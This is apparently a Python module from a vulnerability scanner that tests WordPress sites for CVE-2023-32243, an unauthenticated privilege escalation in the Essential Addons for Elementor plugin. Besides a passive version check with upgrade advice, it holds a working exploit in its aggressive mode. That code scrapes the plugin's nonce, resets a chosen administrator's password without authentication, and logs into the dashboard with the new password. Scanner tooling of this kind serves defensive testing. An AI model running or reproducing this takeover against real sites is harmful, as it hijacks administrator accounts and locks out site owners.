from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import urljoin, urlsplit

from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2023-32243"
NAME = "Essential Addons for Elementor unauthenticated privilege escalation"
COMPONENT = "WordPress plugin Essential Addons for Elementor"
AFFECTED_RULE = "Essential Addons for Elementor 5.4.0 through 5.7.1"
PLUGIN_SLUG = "essential-addons-for-elementor-lite"
PATCHED_VERSION = "5.7.2"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
COMMON_PATHS = ("/", "/contact/", "/contact-us/", "/about/", "/sample-page/")
MAX_CRAWL_PAGES = 12
SKIP_LINK_MARKERS = (
    "/wp-admin",
    "/wp-login",
    "wp-json",
    "xmlrpc.php",
    "?feed=",
    "/feed/",
    "mailto:",
    "javascript:",
    "#",
    ".css",
    ".js",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".svg",
    ".ico",
)


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < parse_version_required("5.4.0"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required(PATCHED_VERSION) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade Essential Addons for Elementor to 5.7.2 or newer and audit administrator accounts.",
        exploit_available=HAS_EXPLOIT,
    )


def _eael_nonce(html: str) -> str | None:
    block = re.search(
        r'id=["\']eael-general-js-extra["\'][^>]*>(.*?)</script>',
        html,
        re.IGNORECASE | re.DOTALL,
    )
    if block:
        match = re.search(r'"nonce":"([a-f0-9]+)"', block.group(1), re.IGNORECASE)
        if match:
            return match.group(1)
    match = re.search(r'"eael_resetpassword_nonce":"([a-f0-9]+)"', html, re.IGNORECASE)
    return match.group(1) if match else None


def _same_site(base: str, url: str) -> bool:
    return urlsplit(base).netloc.lower() == urlsplit(url).netloc.lower()


def _candidate_pages(sess: HttpSession, base: str) -> list[str]:
    pages = [f"{base}{path}" for path in COMMON_PATHS]
    homepage = sess.get("/", timeout=8)
    if homepage.get("status") == 200:
        body = str(homepage.get("body", ""))
        for href in re.findall(r'href=["\']([^"\']+)["\']', body, re.IGNORECASE):
            if any(marker in href.lower() for marker in SKIP_LINK_MARKERS):
                continue
            url = urljoin(base + "/", href)
            if _same_site(base, url) and url not in pages:
                pages.append(url)
            if len(pages) >= MAX_CRAWL_PAGES:
                break
    return pages


def _find_nonce(sess: HttpSession, base: str, page_url: str | None) -> tuple[str, str] | None:
    pages = [page_url] if page_url else _candidate_pages(sess, base)
    for page in pages:
        if not page:
            continue
        response = sess.get(page, timeout=8)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        nonce = _eael_nonce(str(response.get("body", "")))
        if nonce:
            return page, nonce
    return None


def _login_verified(sess: HttpSession, base: str, username: str, password: str) -> tuple[bool, str]:
    sess.get("/wp-login.php", timeout=8)
    login = sess.post(
        "/wp-login.php",
        fields={
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": "/wp-admin/",
            "testcookie": "1",
        },
        timeout=12,
    )
    final_url = str(login.get("final_url") or "")
    body = str(login.get("body", ""))
    return ("/wp-admin/" in final_url and "Dashboard" in body), final_url


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    page_url: str | None = None,
    username: str = "admin",
) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    found = _find_nonce(sess, base, page_url)
    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="No Essential Addons front-end nonce was found on the reachable pages.",
            action="Verify a page using an Essential Addons widget and upgrade to 5.7.2 or newer.",
        )

    nonce_page, nonce = found
    new_password = f"Eael!{secrets.token_hex(6)}"
    response = sess.post(
        "/wp-admin/admin-ajax.php?action=eael-login-register-form",
        fields={
            "eael-resetpassword-submit": "1",
            "page_id": "2",
            "widget_id": f"proofcms-{secrets.token_hex(4)}",
            "eael-resetpassword-nonce": nonce,
            "eael-pass1": new_password,
            "eael-pass2": new_password,
            "rp_login": username,
        },
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"The password-reset request could not obtain an HTTP response ({transport_error_detail(response)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    body = str(response.get("body", ""))
    accepted = '"success":true' in body and "password has been reset" in body.lower()
    if not accepted:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=nonce_page,
            detail=f"The reset-password endpoint did not return the vulnerable success response (HTTP {response.get('status')}).",
            action="Upgrade Essential Addons for Elementor to 5.7.2 or newer and review administrator accounts.",
            evidence={"nonce_page": nonce_page, "response": body[:300]},
        )

    verified, final_url = _login_verified(sess, base, username, new_password)
    evidence = {
        "nonce_page": nonce_page,
        "target_user": username,
        "new_password": new_password,
        "login_verified": verified,
        "login_final_url": final_url,
    }
    if verified:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=nonce_page,
            detail=(
                "The unauthenticated reset-password action changed the administrator password and the new "
                "credentials reached the WordPress dashboard."
            ),
            action=(
                f"Immediately restore the {username} password, audit administrator sessions, and upgrade "
                f"Essential Addons for Elementor to {PATCHED_VERSION} or newer."
            ),
            evidence=evidence,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="VULNERABLE_UPLOAD_ONLY",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=nonce_page,
        detail=(
            "The reset-password endpoint returned the vulnerable success message, but dashboard login "
            "verification did not complete. The administrator password may have been changed."
        ),
        action=(
            f"Restore the {username} password, audit administrator sessions, and upgrade Essential Addons "
            f"to {PATCHED_VERSION} or newer."
        ),
        evidence=evidence,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE requires aggressive lab-only password-reset verification."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Aggressive proof skipped because Essential Addons was not detected as potentially affected."
        return passive

    page_url = aggressive_command if aggressive_command and aggressive_command.startswith(("http://", "https://")) else None
    username = "admin"
    if aggressive_command and not page_url:
        username = aggressive_command.strip() or "admin"
    result = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        page_url=page_url,
        username=username,
    )
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": [">=5.4.0,<5.7.2"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2023-32243",
            "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/essential-addons-for-elementor-lite",
        ],
    }

